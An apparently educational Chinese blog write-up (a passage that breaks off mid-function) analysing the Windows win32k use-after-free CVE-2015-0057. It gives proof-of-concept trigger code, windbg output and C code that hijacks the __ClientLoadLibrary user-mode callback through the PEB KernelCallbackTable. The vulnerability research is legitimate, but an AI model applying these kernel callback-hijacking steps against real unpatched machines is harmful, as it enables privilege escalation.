# Windows 内核漏洞利用之UAF：CVE-2015-0057
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## Introduction
这次是内核中一个 uaf 漏洞的学习，刚好看到 wjllz 师傅的在看雪上的 [windows
内核系列文章](https://bbs.pediy.com/thread-247281.htm)，就也一起分析了 cve-2015-0057 这个洞（膜一发
wjllz 师傅 tql !!!），这篇写的水平肯定也没有 wjllz
师傅的好，也不太会讲故事，权当自己学习过程的记录，希望也能够帮助到你，如有错误多谢指正。
首先这次的漏洞分析也是参考已有的分析资料来学习，已有的资料包括：
  * 漏洞发现者 Udi Yavo of enSilo 的 [分析](https://blog.ensilo.com/one-bit-to-rule-them-all-bypassing-windows-10-protections-using-a-single-bit)
  * Ncc group 详细利用分析的 [writeup](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2015/july/exploiting-the-win32kxxxenablewndsbarrows-use-after-free-cve-2015-0057-bug-on-both-32-bit-and-64-bit-tldr/)
  * keenjoy98 老师在 blackhat 上的议题 [A New CVE-2015-0057 Exploit Technology](https://www.blackhat.com/docs/asia-16/materials/asia-16-Wang-A-New-CVE-2015-0057-Exploit-Technology-wp.pdf)
  * win8.1 x64 下完整利用 [[MS15-010 / CVE-2015-0057] EXPLOITATION](http://hdwsec.fr/blog/20151217-ms15-010/)
刚开始这样做不可避免，全靠自己从分析 patch 到 poc 再到 exploit
的话水平还达不到，不过这是下一阶段的目标，我会努力往这方面靠。说完了让我们开始专注漏洞，主要涉及的知识点有：
  * 用户态回调函数的使用
  * 堆风水
  * win8.1 堆头修复
  * win8.1 smep 绕过
  * 提权 shellcode
## The bug
漏洞出现在内核的 GUI 组件中，也就是 win32k.sys 模块，之前从来没有了解过 win32k 有关的用户态回调函数的利用，不过这里有篇相关的
[paper](https://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_WP.pdf) 可以参考，帮助我们熟悉
win32k.sys。分析资料中直接给出了漏洞所在位置，也可以自己尝试从 patch 分析一波，我尝试对比了一下 patch 版本和原版本的
win32k.sys，有几十处函数有改动，没有任何思路遂放弃。从资料中找到漏洞代码，漏洞位置在
`win32k!xxxEnableWndSBArrows`，抛去如何定位漏洞的部分（因为不会 🙁 233），让我们直接理解漏洞原理：
###  **Unpatched**
以上代码是未经修补的漏洞代码，在适当的情况下 `win32k!xxxDrawScrollBar` 可以触发一个用户态调用让 `tagSBINFO`
对象指针即 `rbx`
被释放掉，而之后以上代码又使用了释放后内存中的值。简单来说就是某种情况下这个函数会触发一个函数回调，而我们可以控制这个函数回调，运行我们指定的代码。
### **Patched**
在 patched 的版本中，使用 `tagSBINFO`
指针之前设置了一道检查，这样导致用户控制的回调函数在设置检查的情况下无法被执行，用户的影响被消除了。
那么怎么控制这个回调函数？以及我们需要执行什么样的代码？这就需要完全理解了整个函数的作用以及其内部执行逻辑之后才能回答这个问题。这部分在 Ncc group
的 writeup 和 udi 的 blog 中有详细的解释，一起来看一下。
漏洞所在位置是跟窗体滚动条相关的，而每个窗体都设置了水平和垂直的滚动条 – scrollbar，参考
[ReactOS](https://doxygen.reactos.org/dd/d79/include_2ntuser_8h_source.html#l00482)
找到结构体定义：
    typedef struct tagSBDATA
    {
        INT posMin;
        INT posMax;
        INT page;
        INT pos;
    } SBDATA, *PSBDATA;
    typedef struct tagSBINFO
    {
        INT WSBflags;
        SBDATA Horz;
        SBDATA Vert;
    } SBINFO, *PSBINFO;
每个 `SBDATA` 结构都定义了相关的 Scrollbar 的属性，`WSBflags` 按照设置了多少比特位来决定 scrollbar
的状态属性。而漏洞所在的函数 `win32k!xxxEnableWndSBArrows` 则是通过这些结构体所描述的信息来设置相应的滚动条属性，参考
`NtUserEnableScrollBar` 函数，它的函数定义如下：
    BOOL xxxEnableWndSBArrows(HWND hWnd, UINT wSBflags, UINT wArrows);
`hWnd` 是窗体句柄，`wSBflags` 决定 scrollbar 的属性，`wArrows` 描述滚动条箭头的属性。
函数总体逻辑可以分为三部分，第一部分是分配新的 scrollbar。函数开始时会检查窗体是否包含滚动条信息，如果需要会重新分配一个 scrollbar
结构体。
相关的符号在 win7 版本中有保留，可以用 windbg 查看，从代码层面来看，函数读取 `pSBInfo` 值，也就是 `tagSBINFO`
结构，并且判断是否位空指针，如果该值为空而 `wArrows` 参数不为空，那么就会给窗体分配一个 `tagSBINFO` 结构，scrollbar
属性相关的 bit 位设置为 0。否则就沿用已有的 `tagSBINFO` 结构中 scrollbar 属性的信息。
在看这部分逆向代码的时候对寄存器所保存的参数有点疑惑，查了下发现 win
平台下函数调用[参数传递](https://docs.microsoft.com/en-us/cpp/build/parameter-passing?view=vs-2017)和之前接触的 linux 平台略有不同（如果有和我一样的困惑的同学可以查看相关链接）。
第二部分是设置滚动条的状态，相关参数值的类型的定义在 WinUser.h 中查看，以及 msdn
上的[文档](https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-enablescrollbar)，`wSBflags` 参数值类型：
    #define SB_HORZ             0   设置禁用水平滚动条
    #define SB_VERT             1   设置禁用垂直滚动条
    #define SB_CTL              2   表示滚动条是滚动条控件 // 具体什么作用不清楚
    #define SB_BOTH             3   设置同时禁用水平和垂直滚动条
参数 `wArrows` 则设置滚动条的箭头是否可用，被设置位表示不可用：
    #define ESB_ENABLE_BOTH     0x0000
    #define ESB_DISABLE_BOTH    0x0003
    #define ESB_DISABLE_LEFT    0x0001
    #define ESB_DISABLE_RIGHT   0x0002
    #define ESB_DISABLE_UP      0x0001
    #define ESB_DISABLE_DOWN    0x0002
    #define ESB_DISABLE_LTUP    ESB_DISABLE_LEFT
    #define ESB_DISABLE_RTDN    ESB_DISABLE_RIGHT
以下代码表示如果设置了 `SB_HORZ` 或 `SB_BOTH` 则判断 `wArrow` 是否为 `ENBLAE` 来决定启用或禁用水平滚动条。
其实漏洞就跟这部分设置有关，让滚动条可见按照一定的设置会触发 `xxxDrawScrollBar` 函数刷新滚动条，然后可能会触发用户态回调函数。
不过在讨论回调函数之前，我们先把后面的看完。和设置水平滚动条的逻辑类似，但不同的是如果 `wArrows` 设置了禁用了，并且前面触发了 uaf
的话，这里就可以对释放后的内存进行一次按位或运算，比如 `wArrows` 为 0x3，而 `tagSBINFO.wSBflags` 为
0x2，那么操作完后值就变为 0xe 了。
## Stage 1
开发漏洞利用通常需要经历好几个阶段，首先要完成的是如何触发漏洞。
我们已经知道设置怎样的参数可以触发 `xxxDrawScrollBar` 函数，要在代码上实现得在 `CreateWindow` 函数中加上
`WS_HSCROLL` 和 `WS_VSCROLL`，虽然默认窗体是可见的，不过加上 `showWindow` 以防万一，然后按照设置的参数调用
`EnableScrollBar`。
    hwnd = CreateWindow(
        szAppName, 
        TEXT("Poc"),
        WS_OVERLAPPEDWINDOW | WS_HSCROLL | WS_VSCROLL,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        NULL, NULL, hInstance, NULL);
    ShowWindow(hwnd, iCmdShow);
    EnableScrollBar(hwnd, SB_BOTH, ESB_DISABLE_BOTH);
    UpdateWindow(hwnd);
那么现在要解决的是怎样控制回调函数，有了回调函数我们可以在用户态把堆中的内存释放掉，再返回内核态的时候情况就变得和原来不一样了，不过我们得找到这个回调函数在哪。
在 Udi 的文章中给出了一张静态分析得出的调用关系图，
执行 `xxxDrawScrollBar` 函数得过程中会调用 `ClientLoadLibrary` 函数，其中又触发了
`KeUserModeCallback` 函数，我们要想办法弄清楚`KeUserModeCallback` 函数调用了什么，然后尝试劫持该调用。  
从 ncc group
的资料中我们可以知道用户态回调函数的一些相关机制，通常每个进程都包含一张用户态回调函数指针的列表，`PEB->KernelCallBackTable`
就指向这张表。当内核想要调用一个用户态函数时就用一个函数索引表示函数在表中的位置，由 `KeUserModeCallback`
函数合法的从内核态转换到用户态，该函数原型如下：
    NTSTATUS KeUserModeCallback (
        IN ULONG ApiNumber,
        IN PVOID InputBuffer,
        IN ULONG InputLength,
        OUT PVOID *OutputBuffer,
        IN PULONG OutputLength
        );
需要注意的是 `ApiNumber` 参数为函数表索引号，接着由用户态函数`KiUserModeCallbackDispatch`
查找索引在回调函数列表中对应的函数并执行，我们可以查看 `PEB->KernelCallBackTable` 把其中对应的地址处的代码修改掉。  
选好断点位置，在 Drawscrollbar 之后对 `nt!KeUserModeCallback`
下断点，虽然很容易在其他地方断下，但是多试几次，就能断在我们的调用链中。
`nt!KeUserModeCallback` 的断点在触发若干次后断在了我们的调用链中：
此时查看 `rcx` 寄存器的值，在函数列表中找到对应的地址：
    kd> r rcx
    rcx=0000000000000002
    kd>  dt !_PEB @$peb
    nt!_PEB
       ...
       +0x058 KernelCallbackTable : 0x00007fff`79070a80 Void
       ...
    kd> dqs 0x00007fff`79070a80
    00007fff`79070a80  00007fff`79053ef0 USER32!_fnCOPYDATA
    00007fff`79070a88  00007fff`790aadb0 USER32!_fnCOPYGLOBALDATA
    00007fff`79070a90  00007fff`79043b90 USER32!_fnDWORD
    00007fff`79070a98  00007fff`790459b0 USER32!_fnNCDESTROY
    00007fff`79070aa0  00007fff`79055640 USER32!_fnDWORDOPTINLPMSG
    00007fff`79070aa8  00007fff`790ab2b0 USER32!_fnINOUTDRAG
    00007fff`79070ab0  00007fff`79053970 USER32!_fnGETTEXTLENGTHS
    00007fff`79070ab8  00007fff`7907f1c0 USER32!__fnINCNTOUTSTRING
    ...
这里比较坑的点是 `nt!KeUserModeCallback`
会被很多地方调用很多次，这样每次断下来查看一下栈回溯才知道是不是处于我们的函数链中，最麻烦的是你无法确定该选用哪个回调函数去 hook，`_fnDWORD`
也会在 DrawScrollBar 中被触发回调，不过这是一个已经被完成的利用，虽然不知道利用开发者是如何知道 `__ClientLoadLibrary`
函数是适合被 hook 的，可能调用次数比较少，这里纠结了许久，最后就当学习了吧（tql 233）。
那么现在我们确定要 hook 的函数是 `__ClientLoadLibrary`，经过计算它的偏移是 `0x238`，用以下代码获取它的地址：
    ULONG_PTR Get__ClientLoadLibrary()
    {
        ULONG_PTR addr = NULL;
        addr = *(ULONG_PTR *)(__readgsqword(0x60) + 0x58) + 0x238; // gs:[60] 表示 peb 的地址，用 __readgsqword 读取 peb 地址
        return addr;
    }
接着把获取到的地址上的值覆盖成我们自定义的函数 fakehook 函数的地址，用一个赋值就行了。
    *(ULONG_PTR *)_ClientLoadLibrary_addr = (ULONG_PTR)Fake__ClientLoadLibrary;
有了 hook 的自定义函数之后我们就可以做些事情，想办法触发 uaf。要考虑到回调函数可能在系统其它地方被多次调用，我们在执行自定义函数的时候设置
hookflag 变量 和 hookcount 变量，在执行到 `EnableScrollBar` 之前把 hookflag 设置为 1，表示可以开始
hook 回调函数，而 hookcount 表示自 hookflag 变量设置后第几次 hook 到回调函数，那么我们只要确认需要执行的是第几次 hook
到的回调函数，代码如下。
    VOID Fake__ClientLoadLibrary(VOID* a)
    {
        if (hookflag)
        {
            if (++hookcount == 2)
            {